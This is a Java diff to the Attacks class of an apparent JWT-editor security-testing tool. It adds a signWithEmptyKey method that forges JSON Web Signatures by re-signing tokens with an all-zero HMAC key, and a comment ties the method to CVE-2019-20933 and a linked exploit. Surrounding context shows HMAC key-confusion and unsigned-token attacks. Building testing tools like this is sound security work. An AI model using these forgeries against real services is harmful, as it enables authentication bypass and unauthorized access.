@@ -24,6 +24,7 @@ import com.blackberry.jwteditor.exceptions.UnsupportedKeyException;
 import com.blackberry.jwteditor.model.jose.JWS;
 import com.blackberry.jwteditor.model.jose.JWSFactory;
 import com.blackberry.jwteditor.model.keys.JWKKey;
+import com.blackberry.jwteditor.model.keys.Key;
 import com.blackberry.jwteditor.utils.ByteArrayUtils;
 import com.blackberry.jwteditor.utils.PEMUtils;
 import com.nimbusds.jose.JOSEObjectType;
@@ -32,15 +33,24 @@ import com.nimbusds.jose.JWSHeader;
 import com.nimbusds.jose.jwk.JWK;
 import com.nimbusds.jose.jwk.OctetSequenceKey;
 import com.nimbusds.jose.util.Base64URL;
+import com.nimbusds.jose.util.JSONObjectUtils;
 
 import java.lang.reflect.Field;
+import java.text.ParseException;
+import java.util.Map;
+import java.util.Set;
 
 import static com.blackberry.jwteditor.model.jose.JWSFactory.jwsFromParts;
+import static com.nimbusds.jose.HeaderParameterNames.ALGORITHM;
+import static com.nimbusds.jose.JOSEObjectType.JWT;
+import static com.nimbusds.jose.JWSAlgorithm.*;
 
 /**
  * Implementations of common JWS attacks
  */
 public class Attacks {
+    private static final Set<JWSAlgorithm> SYMMETRIC_ALGORITHMS = Set.of(HS256, HS384, HS512);
+    private static final byte[] EMPTY_KEY = new byte[64];
 
     /**
      * Perform a HMAC key confusion attack
@@ -89,6 +99,22 @@ public class Attacks {
         String decodedHeader = String.format("{\"typ\":\"JWT\",\"alg\":\"%s\"}", algorithm); //NON-NLS
         Base64URL header = Base64URL.encode(decodedHeader);
         return jwsFromParts(header, jws.getEncodedPayload(), Base64URL.encode(new byte[0]));
+    }
+
+    //  CVE-2019-20933 => https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
+    public static JWS signWithEmptyKey(JWS jws, JWSAlgorithm algorithm) throws UnsupportedKeyException, ParseException, SigningException {
+        if (!SYMMETRIC_ALGORITHMS.contains(algorithm)) {
+            throw new IllegalArgumentException("Invalid algorithm %s. Can only use symmetric algorithms.".formatted(algorithm));
+        }
+
+        Map<String, Object> headerJsonMap = JSONObjectUtils.parse(jws.getHeader());
+        headerJsonMap.put(ALGORITHM, algorithm.getName());
+        Base64URL headerBase64 = JWSHeader.parse(headerJsonMap).toBase64URL();
+
+        JWSHeader signingInfo = new JWSHeader.Builder(algorithm).type(JWT).build();
+        Key key = new JWKKey(new OctetSequenceKey.Builder(EMPTY_KEY).build());
+
+        return JWSFactory.sign(key, headerBase64, jws.getEncodedPayload(), signingInfo);
     }
 
     /**
